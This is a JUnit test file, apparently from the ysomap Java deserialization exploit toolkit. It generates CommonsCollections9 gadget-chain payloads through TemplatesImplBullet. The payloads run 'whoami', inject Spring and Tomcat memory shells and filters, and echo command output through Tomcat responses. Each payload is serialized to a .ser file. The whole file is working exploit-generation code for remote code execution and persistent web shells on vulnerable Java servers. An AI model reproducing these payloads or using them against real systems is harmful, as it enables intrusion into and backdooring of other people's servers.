package ysomap.core.payload.java.jdk;

import org.junit.Test;
import ysomap.core.bean.Bullet;
import ysomap.core.bean.Payload;
import ysomap.core.bullet.jdk.TemplatesImplBullet;
import ysomap.core.payload.java.collections.CommonsCollections9;
import ysomap.core.serializer.Serializer;

import java.io.FileOutputStream;


public class TemplatesImplBulletTest {
    @Test
    public void test() {
        try {
            Payload payload = new CommonsCollections9();
            Bullet bullet = new TemplatesImplBullet();
            bullet.set("shellInjection", "true");
            bullet.set("body", "path:1.txt");
            bullet.set("classname", shell.SpringShell.class.getName());
            payload.setBullet(bullet);
            Serializer serializer = payload.getSerializer();
            serializer.serialize(payload.getObject(), new FileOutputStream("1.ser"));

            payload = new CommonsCollections9();
            bullet = new TemplatesImplBullet();
            bullet.set("springRegister", "true");
            bullet.set("body", "whoami");
            bullet.set("classname", shell.SpringShell.class.getName());
            payload.setBullet(bullet);
            serializer = payload.getSerializer();
            serializer.serialize(payload.getObject(), new FileOutputStream("2.ser"));


            payload = new CommonsCollections9();
            bullet = new TemplatesImplBullet();
            bullet.set("body", "whoami");
            bullet.set("tomcatEcho", "true");
            payload.setBullet(bullet);
            serializer = payload.getSerializer();
            serializer.serialize(payload.getObject(), new FileOutputStream("3.ser"));


            payload = new CommonsCollections9();
            bullet = new TemplatesImplBullet();
            bullet.set("body", "path:2.txt");
            bullet.set("tomcatRequest", "true");
            bullet.set("classname", shell.TomcatFilter.class.getName());
            payload.setBullet(bullet);
            serializer = payload.getSerializer();
            serializer.serialize(payload.getObject(), new FileOutputStream("4.ser"));


            payload = new CommonsCollections9();
            bullet = new TemplatesImplBullet();
            bullet.set("body", "whoami");
            bullet.set("tomcatRegister", "true");
            bullet.set("classname", shell.TomcatFilter.class.getName());
            payload.setBullet(bullet);
            serializer = payload.getSerializer();
            serializer.serialize(payload.getObject(), new FileOutputStream("5.ser"));

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
